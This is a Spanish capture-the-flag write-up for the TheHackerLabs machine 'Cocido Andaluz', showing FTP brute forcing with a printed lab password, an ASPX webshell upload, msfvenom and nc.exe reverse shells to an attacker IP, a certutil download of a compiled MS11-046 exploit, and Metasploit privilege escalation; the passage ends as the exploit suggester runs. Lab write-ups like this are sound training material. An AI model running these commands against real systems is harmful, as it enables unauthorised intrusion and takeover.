---
title: "Cocido Andaluz - TheHackerLabs"
date: 2025-02-03
draft: false
slug: "THL-writeup-cocidoAndaluz"
excerpt: "Esta fue una máquina bastante sencilla con la que pude probar varias cosillas. Después de aplicar los escaneos y al no encontrar una forma de enumerar sus servicios, aplicamos fuerza bruta al servicio FTP, encontrando un usuario y contraseñas válidos que nos permiten acceso a FTP y SMB. Dentro, descubrimos que usan el servicio FTP como un servidor para su página web, por lo que aprovechamos esto para cargar una WebShell de ASPX que nos permite ejecutar comandos. Aprovechamos esto para usar varios métodos que nos permiten ganar acceso a la máquina. Ya dentro y enumerando la máquina, descubrimos que es vulnerable a dos Exploits que nos permiten escalar privilegios, estos son: MS11-046 y MS15-051."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "Microsoft IIS", "ASP.NET", "FTP", "SMB", "FTP Enumeration", "Brute Force Attack", "ASP/ASPX Payload", "Abusing FTP Service", "Abusing IIS Service", "ASPX WebShell", "Reverse Shell", "System Recognition (Windows)", "Local Privilege Escalation", "MS11-046 (LPE)", "MS15-051 (LPE)", "Privesc - MS11-046 (LPE)", "Privesc - MS15-051 (LPE)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "wappalizer"
  - "ftp"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "hydra"
  - "locate"
  - "aspx_cmd.aspx"
  - "msfvenom"
  - "nc.exe"
  - "metasploit framework (msfconsole)"
  - "meterpreter"
  - "Módulo: `post/multi/recon/local_exploit_suggester`"
  - "Módulo: `exploit/windows/local/ms15_051_client_copy_image`"
  - "rlwrap"
  - "nc"
  - "impacket-smbserver"
  - "whoami"
  - "systeminfo"
  - "searchsploit"
  - "i686-w64-mingw32-gcc"
  - "python3"
  - "certutil.exe"
links:
  - "https://github.com/bitsadmin/wesng"
  - "https://github.com/rasta-mouse/Watson/tree/master"
  - "https://www.exploit-db.com/exploits/39719"
  - "https://www.exploit-db.com/exploits/40564"
  - "https://www.exploit-db.com/exploits/37367"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-cocidoAndaluz/CocidoAndaluz.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Nmap scan report for 192.168.1.80
Host is up (0.00020s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for Tu_IP
Host is up.
Nmap done: 256 IP addresses (14 hosts up) scanned in 2.43 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.213	XX	PCS Systemtechnik GmbH

14 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.179 seconds (117.49 hosts/sec). 14 responded
```

Encontramos nuestro objetivo y es:`192.168.1.80`

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.80
PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
64 bytes from 192.168.1.80: icmp_seq=1 ttl=128 time=2.91 ms
64 bytes from 192.168.1.80: icmp_seq=2 ttl=128 time=0.947 ms
64 bytes from 192.168.1.80: icmp_seq=3 ttl=128 time=0.952 ms
64 bytes from 192.168.1.80: icmp_seq=4 ttl=128 time=0.945 ms

--- 192.168.1.80 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3088ms
rtt min/avg/max/mdev = 0.945/1.438/2.908/0.848 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.80 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:44 CST
Initiating ARP Ping Scan at 12:44
Scanning 192.168.1.80 [1 port]
Completed ARP Ping Scan at 12:44, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:44
Scanning 192.168.1.80 [65535 ports]
Discovered open port 80/tcp on 192.168.1.80
Discovered open port 139/tcp on 192.168.1.80
Discovered open port 445/tcp on 192.168.1.80
Discovered open port 135/tcp on 192.168.1.80
Discovered open port 21/tcp on 192.168.1.80
Discovered open port 49158/tcp on 192.168.1.80
Discovered open port 49154/tcp on 192.168.1.80
Discovered open port 49155/tcp on 192.168.1.80
Discovered open port 49156/tcp on 192.168.1.80
Discovered open port 49157/tcp on 192.168.1.80
Discovered open port 49153/tcp on 192.168.1.80
Discovered open port 49152/tcp on 192.168.1.80
Completed SYN Stealth Scan at 12:45, 50.41s elapsed (65535 total ports)
Nmap scan report for 192.168.1.80
Host is up, received arp-response (0.0038s latency).
Scanned at 2025-02-03 12:44:39 CST for 50s
Not shown: 38898 filtered tcp ports (no-response), 26625 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 128
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
49158/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 50.68 seconds
           Raw packets sent: 220613 (9.707MB) | Rcvd: 26642 (1.066MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Bien, parece que está activa una página web en el **puerto 80** y veo activo el **servicio FTP** en el **puerto 21**, quizá estén relacionados, pero eso lo veremos más adelante.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 192.168.1.80 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:47 CST
Nmap scan report for 192.168.1.80
Host is up (0.0013s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 7.0

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_nbstat: NetBIOS name: WIN-JG67MIHZH2X, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-02-03T18:48:09
|_  start_date: 2025-02-03T10:36:35
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.65 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Se me hace bastante curioso que tiene desplegado **Apache**, cuando normalmente es **IIS o HFS** o algo relacionado con **Windows**. Además, parece que el **servicio SMB** no nos pide credenciales para conectarnos.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura1.png">
</p>

Tenemos la página por defecto de **Apache**.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura2.png">
</p>

No veo nada que nos sirva.

Te diría que aplicáramos **Fuzzing**, pero en mi caso no encontré nada, por lo que vamos a saltarnos esa parte.

Vamos a ver si podemos entrar al **servicio FTP**.

### Analizando Servicio FTP {#FTP}

Si revisamos el **escaneo de nmap**, no mostró información sobre este servicio, así que vamos a usar un script de **nmap** para ver si existe el **usuario anonymous** para poder loguearnos:
```bash
nmap -p 21 --script ftp-anon 192.168.1.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:14 CST
Nmap scan report for 192.168.1.80
Host is up (0.00092s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```
No encontró nada y podremos hacer nada tampoco.

Por ahora, vamos a dejar este servicio.

### Analizando Servicio SMB {#SMB}

Veamos qué información nos da **crackmapexec**:
```bash
crackmapexec smb 192.168.1.80
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
```
Como nos mostró el escaneo, parece que no pide credenciales para poder loguearnos.

Veamos si podemos listar los archivos compartidos con **smbclient**:
```bash
smbclient -L //192.168.1.80// -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.80 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Parece que sí puede loguearse con un usuario anónimo, pero no está mostrando nada.

De pura casualidad, probemos si podemos ver algo con **smbmap**:
```bash
smbmap -H 192.168.1.80
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
.
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Access denied on 192.168.1.80, no fun for you...                                                                  
[*] Closed 1 connections
```
Nada tampoco.

Te diría que fuéramos a analizar el **servicio RPC**, pero tampoco podremos hacer algo.

Lo que queda, es hacer **fuerza bruta**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio FTP {#FTPbrute}

Vamos a empezar aplicando **fuerza bruta** al **servicio FTP**, pero al no tener un usuario, debemos especificar un diccionario de usuarios.

Yo usaré el diccionario de usuarios de **seclists**, que debería está en la ruta: `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.

Esta vez, usaremos otro diccionario para las contraseñas, ya que **rockyou.txt** tarda demasiado y no encuentra la contraseña, este será: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt`.

Apliquemos el ataque con **hydra**:
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.1.80 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-03 13:50:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43048882131570 login tries (l:8295455/p:5189454), ~2690555133224 tries per task
[DATA] attacking ftp://192.168.1.80:21/
[STATUS] 4305.00 tries/min, 4305 tries in 00:01h, 43048882127265 to do in 166662338:52h, 16 active
[21][ftp] host: 192.168.1.80   login: info   password: PolniyPizdec0211
...
```
Excelente, vamos a comprobar con **crackmapexec** si son válidos.

Primero con el **servicio FTP**:
```bash
crackmapexec ftp 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
FTP         192.168.1.80 21     192.168.1.80  [*] Banner: Microsoft FTP Service
FTP         192.168.1.80 21     192.168.1.80  [+] info:PolniyPizdec0211
```
Sí funcionan.

Ahora con el **servicio SMB**:
```bash
crackmapexec smb 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [+] WIN-JG67MIHZH2X\info:PolniyPizdec0211
```
También funcionan.

Ahora podemos entrar al **servicio FTP** y al **servicio SMB**, aunque en **SMB** no encontraremos nada, así que vamos directo con **FTP**.

### Enumeración de Servicio FTP y Subiendo una WebShell de ASPX {#EnumFTPyWebshell}

Entremos al **servicio FTP**:
```batch
ftp info@192.168.1.80
Connected to 192.168.1.80.
220 Microsoft FTP Service
331 Password required for info.
Password: 
230 User info logged in.
Remote system type is Windows_NT.
ftp>
```
Estamos dentro.

Veamos que archivos hay aquí:
```batch
ftp> ls
227 Entering Passive Mode (192,168,100,213,192,7).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
ftp>
```
Excelente, parece que por aquí podremos subir archivos y serán representados en la página web.

Vamos a probar subiendo un archivo de texto random:
```batch
ftp> put prueba.txt
local: prueba.txt remote: prueba.txt
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|    20       23.33 KiB/s    --:-- ETA
226 Transfer complete.
20 bytes sent in 00:00 (0.40 KiB/s)
ftp> ls
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group              20 Feb  3 21:13 prueba.txt
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
```
Ahí está.

Ahora vamos a ver si aparece en la página web:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura3.png">
</p>

Se puede ver.

Sabiendo esto y que la máquina usa un **servidor IIS** y **ASP.NET**, podemos usar una **webshell** tipo **ASPX** que sirva como una **CMD**.

En kali ya tenemos una:
```bash
locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
```

Copiamos cualquiera de esos dos en tu directorio actual de trabajo y lo subimos al **FTP**:
```batch
ftp> put aspx_cmd.aspx
local: aspx_cmd.aspx remote: aspx_cmd.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  1438       47.28 MiB/s    --:-- ETA
226 Transfer complete.
1438 bytes sent in 00:00 (33.16 KiB/s)
ftp>
```

Y vayamos a la página web, especificando el archivo:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura4.png">
</p>

Ahí está, ya solo ejecuta un comando:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura5.png">
</p>

Listo, tenemos una **WebShell** que podemos usar para conectarnos a la máquina víctima.

### Conectándonos a la Máquina Víctima con Distintos Métodos {#DistMetodos}

Vamos a realizar al menos 4 formas en las que podemos ganar acceso a la máquina.

2 de ellas, ya las he realizado en la **máquina Devel**

Puedes elegir cualquiera de estas para continuar.

#### Creando y Ejecutando una Reverse Shell de ASPX con msfvenom {#RevShell}

Vamos a generar una **Reverse Shell** con formato **ASPX** utilizando **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2736 bytes
Saved as: shell.aspx
```

Vamos a cargar el archivo al **FTP**, pero con el modo binario para que no se llegue modificar nada durante la transferencia:
```batch
ftp> binary
200 Type set to I.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  2774       75.58 MiB/s    --:-- ETA
226 Transfer complete.
2774 bytes sent in 00:00 (59.81 KiB/s)
```

Ahora, con **rlwrap** usamos **netcat** para abrir un listener y esperar a obtener la **Reverse Shell**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Y ya solo nos metemos al archivo que cargamos desde la página web y ya obtendremos la conexión:
```batch
rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49184
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\servicio de red
```
Estamos dentro.

#### Cargando y Utilizando Binario nc.exe para Obtener Conexión {#BinNC}

Dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.

Búscala y cópiala en tu directorio actual de trabajo:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Una vez que la tengas copiada, transfierela al **FTP**:
```batch
ftp> binary
200 Type set to I.
ftp> put nc.exe
local: nc.exe remote: nc.exe
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************| 59392       16.26 MiB/s    00:00 ETA
226 Transfer complete.
59392 bytes sent in 00:00 (1.51 MiB/s)
```

Bien, ya está dentro del **FTP**, pero para poder usarla, necesitas especificar la ruta en donde se encuentra el binario y es posible que se encuentre en 2 lugares:
* `C:\inetpub\wwwroot\`
* `C:\inetpub\ftproot\`

Aunque normalmente es la primer ruta.

Usa **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Desde la **WebShell** usa el siguiente comando que usara el binario de **netcat**, para mandar una **CMD** a nuestra máquina:
```batch
C:\inetpub\wwwroot\nc.exe cmd -e Tu_IP 443
```

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura6.png">
</p>

Y observa la conexión obtenida:
```batch
rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49185
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.

c:\windows\system32\inetsrv>
```
Listo, estamos dentro.

#### Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX {#RevShell2}

Vamos a crear una **Reverse Shell** con **msfvenom**, especificando que será un payload para obtener una sesión de **meterpreter**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4444 -f aspx -o meterpreterShell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2867 bytes
Saved as: meterpreterShell.aspx
```

Ahora, vamos a automatizar la obtención del handler que nos da la sesión del **meterpreter**, metiendo los comandos en un script de **Ruby**:
```bash
nano handler.rc
---------------
USE exploit/multi/handler
set LHOST Tu_IP
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

Ejecutamos el script con **Metasploit**:
```bash
msfconsole -q -r handler.rc
[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set LHOST Tu_IP
LHOST => Tu_IP
resource (handler.rc)> set LPORT 4444
LPORT => 5555
resource (handler.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (handler.rc)> exploit
[*] Started reverse TCP handler on Tu_IP:4444
```

Vamos a cargar nuestra **Reverse Shell** al **FTP**:
```batch
ftp> binary
200 Type set to I.
ftp> put meterpreterShell.aspx 
local: meterpreterShell.aspx remote: meterpreterShell.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  2867       20.25 MiB/s    00:00 ETA
226 Transfer complete.
2867 bytes sent in 00:00 (65.27 KiB/s)
```

Ya solamente entramos en nuestro archivo desde la página web:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura7.png">
</p>

Y ya tendremos nuestra sesión de **meterpreter**:
```bash
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Sending stage (177734 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.80:49187) at 2025-02-03 21:30:19 -0600
.
meterpreter > getuid
Server username: NT AUTHORITY\Servicio de red
meterpreter > sysinfo
Computer        : WIN-JG67MIHZH2X
OS              : Windows Server 2008 (6.0 Build 6001, Service Pack 1).
Architecture    : x86
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

#### Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión {#BinNC2}

Como mencione antes, dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.

Búscala y cópiala en tu directorio actual de trabajo:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Desde tu directorio actual de trabajo, vamos a levantar el **servicio SMB** para que podamos usar el **binario nc.exe** desde la **WebShell**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
.
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Usa **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Por último, vamos a usar nuestro **Servicio SMB** para poder usar remotamente el **binario nc.exe** y mandar una conexión hacia nuestra máquina:
```batch
\\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443
```

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura8.png">
</p>

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49160
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\servicio de red
```

Ya solo podemos obtener la flag del usuario:
```batch
c:\windows\system32\inetsrv>cd C:\Users\info
cd C:\Users\info
.
C:\Users\info>type user.txt
...
```

## Post Explotación {#Post}

### Enumeración de Máquina Windows {#EnumWin}

Veamos qué privilegios tiene nuestro usuario:
```batch
C:\Temp>whoami /priv
whoami /priv
.
INFORMACI�N DE PRIVILEGIOS
--------------------------
.
Nombre de privilegio          Descripci�n                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
```
Podríamos usar **JuicyPotato**, pero no funcionará, ya que solo sirve para **arquitecturas x64**.

Tenemos varías opciones para enumerar de forma automatizada como:
* <a href="https://github.com/rasta-mouse/Watson/tree/master" target="_blank">Repositorio de rasta-mouse: Watson</a>
* <a href="https://github.com/bitsadmin/wesng" target="_blank">Repositorio de bitsadmin: Windows Exploit Suggester - Next Generation (WES-NG)</a>
* Módulo `post/multi/recon/local_exploit_suggester` de **Metasploit**.

Pero en mi caso no funcionaron la mayoría.

Entonces, obtengamos la información de la máquina:
```batch
C:\Temp>systeminfo
systeminfo

Nombre de host:                            WIN-JG67MIHZH2X
Nombre del sistema operativo:              Microsoft� Windows Server� 2008 Datacenter 
Versi�n del sistema operativo:             6.0.6001 Service Pack 1 Compilaci�n 6001
Fabricante del sistema operativo:          Microsoft Corporation
Configuraci�n del sistema operativo:       Servidor independiente
Tipo de compilaci�n del sistema operativo: Multiprocessor Free
Propiedad de:                              Usuario de Windows
Organizaci�n registrada:                   
Id. del producto:                          92577-082-2500446-76907
Fecha de instalaci�n original:             14/06/2024, 12:21:47
Tiempo de arranque del sistema:            04/02/2025, 5:19:51
...
...
...
```
Vamos a buscar un Exploit para la versión de Windows que muestra: **Microsoft Windows Server 2008 Datacenter**.

Y encontramos estos dos:
* <a href="https://www.exploit-db.com/exploits/40564" target="_blank">Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a>
* <a href="https://www.exploit-db.com/exploits/39719" target="_blank">Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)</a>

Como no podemos usar **PowerShell**, vamos a usar la primera opción.

### Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) {#PostExp}

La podemos encontrar dentro de Kali:
```bash
searchsploit MS11-046
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                                                                   | windows_x86/local/40564.c
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                                                                 | windows/dos/18755.c

|---|---|
Shellcodes: No Results
```
Usamos la primer opción.

Copiamos el Exploit en nuestro directorio de trabajo:
```bash
searchsploit -m windows_x86/local/40564.c
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
    Codes: CVE-2011-1249, MS11-046
 Verified: True
File Type: C source, ASCII text
```
Analizando el Exploit, nos menciona que debemos compilarlo para obtener el binario que usaremos para escalar privilegios.

Compilamos el Exploit:
```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

Ya solo es cuestión de mandarlo a la máquina víctima.

Abre un servidor con **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Usaremos **certutil.exe** para descargar el Exploit en la máquina víctima:
```batch
C:\Temp>certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe
certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe
****  En l�nea  ****
CertUtil: -URLCache comando completado correctamente.
```

Y lo ejecutamos:
```batch
C:\Temp>MS11-046.exe
MS11-046.exe
.
c:\Windows\System32>whoami
whoami
nt authority\system
```
Listo, ya somos el **usuario administrador**.

### Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit) {#PostExp2}

En este caso, vamos a usar el módulo `post/multi/recon/local_exploit_suggester` para aprovechar que tenemos una sesión de **meterpreter**.

Vamos a configurarlo:
```bash
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

Lo ejecutamos:
```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit
